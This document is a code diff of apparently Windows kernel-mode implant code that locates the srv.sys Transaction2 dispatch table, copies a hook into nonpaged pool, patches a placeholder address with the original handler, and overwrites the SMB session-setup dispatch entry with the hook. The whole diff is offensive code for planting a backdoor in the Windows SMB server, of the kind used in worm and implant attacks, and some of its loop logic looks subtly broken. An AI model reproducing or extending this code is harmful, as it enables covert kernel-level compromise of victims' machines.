@@ -36,8 +36,6 @@
 #define NT_HDR(x) (PIMAGE_NT_HEADERS)\
 (RV2OFF(x, ((PIMAGE_DOS_HEADER)x)->e_lfanew))
 
-LPVOID g_SrvTransactionNotImplemented;
-
 INT WindowsEntrypoint()
 {
   struct Functions Func = { 0 };
@@ -97,25 +95,18 @@ INT WindowsEntrypoint()
 	   (((ULONG_PTR)TrnTbl[11]) == ((ULONG_PTR)TrnTbl[12])) &&
 	   (((ULONG_PTR)TrnTbl[11]) == ((ULONG_PTR)TrnTbl[9])))
       {
-	/*
-	 * At this point, we should've reached 
-	 * srv!SrvTransaction2Dispatch Table,
-	 * and we can then copy over our hook,
-	 * and overwrite its function pointer 
-	 * with the hook.
-	!*/
         TblPtr = TrnTbl; goto FoundTransactionTable;     
       };
-      TrnTbl++;
-    } while ( SecNm1-- != 0 );
+    } while ( SecNm1-- != 0 && TrnTbl++ );
 
     NTSTATUS 
-    SpAcceptLsaModeContext_Hook(PVOID WorkContext)
+    SrvNotImplemented_Hook(PVOID WorkContext)
     {
-      return 0;
+      return ((SrvTransactionNotImplemented_t)0x4141414142424242)
+	      (WorkContext);
     };
     VOID 
-    SpAcceptLsaModeContext_Hook_End() {};
+    SrvNotImplemented_Hook_End() {};
 
 FoundTransactionTable:
     Func.ExAllocatePool = GetPeFunc(
@@ -123,16 +114,24 @@ FoundTransactionTable:
     );
 
     HookNm = (DWORD)(
-	((ULONG_PTR)&SpAcceptLsaModeContext_Hook_End) - 
-	((ULONG_PTR)&SpAcceptLsaModeContext_Hook));    
-    
+	((ULONG_PTR)&SrvNotImplemented_Hook_End) - 
+	((ULONG_PTR)&SrvNotImplemented_Hook));
+    SecNm1 = HookNm;
+
     HckPtr = Func.ExAllocatePool(NonPagedPool, HookNm);
     
     OnePtr = HckPtr; TwoPtr = (LPVOID)
-      &SpAcceptLsaModeContext_Hook;
+      &SrvNotImplemented_Hook;
 
     do {
       *(BYTE *)OnePtr++ = *(BYTE *)TwoPtr++;
+    } while ( SecNm1-- != 0 );
+
+    do {
+      if ( *(ULONG_PTR *)OnePtr == 0x4141414142424242 ) {
+        *(ULONG_PTR *)OnePtr = (ULONG_PTR)TrnTbl[INDEX_SESSION_SETUP];
+      };
+      OnePtr--;
     } while ( HookNm-- != 0 );
 
     TrnTbl[INDEX_SESSION_SETUP]    = (LPVOID)HckPtr;
